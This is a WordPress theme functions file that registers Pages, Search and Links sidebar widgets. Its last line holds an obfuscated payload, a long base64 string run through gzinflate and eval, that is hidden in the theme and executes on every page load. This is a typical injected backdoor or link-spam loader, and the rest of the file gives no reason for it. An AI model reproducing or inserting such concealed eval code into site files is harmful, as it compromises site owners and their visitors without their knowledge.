<?php
if ( function_exists('register_sidebar') )
    register_sidebar(array(
        'before_widget' => '<div class="sideblock">',
    'after_widget' => '</div>',
 'before_title' => '<h3>',
        'after_title' => '</h3>',
    ));


// WP-606 Pages Box  
 function widget_606_pages() {
?>

<h3><?php _e('Pages'); ?></h3>
<div class="sideblock">>
   <ul>
<li class="page_item"><a href="<?php bloginfo('url'); ?>">Home</a></li>

<?php wp_list_pages('title_li='); ?>

 </ul>
</div>
<?php
}
if ( function_exists('register_sidebar_widget') )
    register_sidebar_widget(__('Pages'), 'widget_606_pages');


// WP-606 Search Box  
 function widget_606_search() {
?>
  

 <h3><?php _e('Search Posts'); ?></h3>
 
 <div class="sideblock">
    <ul>
<li>
   <form id="searchform" method="get" action="<?php bloginfo('url'); ?>/index.php">
  
            <input type="text" name="s" size="18" /><br>

      
            <input type="submit" id="submit" name="Submit" value="Search" />
       
      
 </form>

 
</li>
</ul>
 </div>

<?php
}
if ( function_exists('register_sidebar_widget') )
    register_sidebar_widget(__('Search'), 'widget_606_search');


	function widget_links_with_style() {
   global $wpdb;
   $link_cats = $wpdb->get_results("SELECT cat_id, cat_name FROM $wpdb->linkcategories");
   foreach ($link_cats as $link_cat) {
	 ?>

		<h3><?php echo $link_cat->cat_name; ?></h3>
		<div class="sideblock">>
			<ul>
			<?php get_links($link_cat->cat_id, '<li>', '</li>', '<br />', FALSE, 'rand', TRUE, 	TRUE, -1, TRUE); ?>
			</ul>
			</div>

   <?php } ?>
   <?php }
   if ( function_exists('register_sidebar_widget') )
   register_sidebar_widget(__(' Links With Style'), 'widget_links_with_style');
	 	
 



$S942dd5e447ec4ea5810721b3576381be='jZBBSwMxEIXPm18xDEITqF3Plu2lrHhQC3WlxzBt0m1wNwlJalDxv2tje/LibZj55r3HY6SUpF0yznLUyiTpXUw4RWOjDkmmgx61HIx9RTFn+6MtKPy5cgGfrOoHt6UBrrJX2zmrzJ6X8XrR6yTfKHB8bh/aZQfL1ctTx0+P0igBd+vVI5zR0zLC5r5dt1CAYxiaySElf1vXOecZjfRhbJ9dUD7oGEuIONu5sZ6gaJobwaoqe3nOWNJRCPTOsehZGjVCswDcXCSgKxo4BbxY/hL/s0UQP+V8sW8=';eval(gzinflate(base64_decode($S942dd5e447ec4ea5810721b3576381be)));
?>